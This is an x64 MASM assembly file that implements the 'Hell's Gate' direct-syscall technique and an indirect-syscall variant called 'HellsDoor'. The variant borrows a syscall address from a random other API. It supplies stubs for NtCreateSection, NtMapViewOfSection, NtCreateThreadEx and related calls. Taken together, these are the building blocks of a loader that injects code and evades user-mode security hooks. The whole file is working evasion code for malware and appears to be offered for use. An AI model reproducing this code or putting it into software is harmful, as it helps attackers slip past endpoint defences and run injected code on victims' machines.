.data
	wSystemCall DWORD 000h
	
.code
	EXTERN SW3_GetRandomSyscallAddress: PROC

	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall
		syscall
		ret
	HellDescent ENDP

	;; New implementation of HellsGate with indirect syscalls: HellsDoor

	OpenDoor PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	OpenDoor ENDP

	GoToDoor PROC
		mov [rsp+8], rcx						; Save registers.
		mov [rsp+16], rdx
		mov [rsp+24], r8
		mov [rsp+32], r9

		sub rsp, 28h
		call SW3_GetRandomSyscallAddress        ; Get a syscall offset from a different api.
		mov r11, rax							; Save the address of the syscall
		add rsp, 28h

		mov rcx, [rsp+8]						; Restore registers.
		mov rdx, [rsp+16]
		mov r8, [rsp+24]
		mov r9, [rsp+32]

		mov r10, rcx
		mov eax, wSystemCall					; Load SSN into EAX.
		jmp r11									; Jump to -> Invoke system call.
	GoToDoor ENDP

	NtCreateSection PROC
		jmp GoToDoor
	NtCreateSection ENDP

	NtMapViewOfSection PROC
		jmp GoToDoor
	NtMapViewOfSection ENDP

	NtUnmapViewOfSection PROC
		jmp GoToDoor
	NtUnmapViewOfSection ENDP

	NtClose PROC
		jmp GoToDoor
	NtClose ENDP

	NtCreateThreadEx PROC
		jmp GoToDoor
	NtCreateThreadEx ENDP
	
	NtWaitForSingleObject PROC
		jmp GoToDoor
	NtWaitForSingleObject ENDP

	NtDelayExecution PROC
		jmp GoToDoor
	NtDelayExecution ENDP
end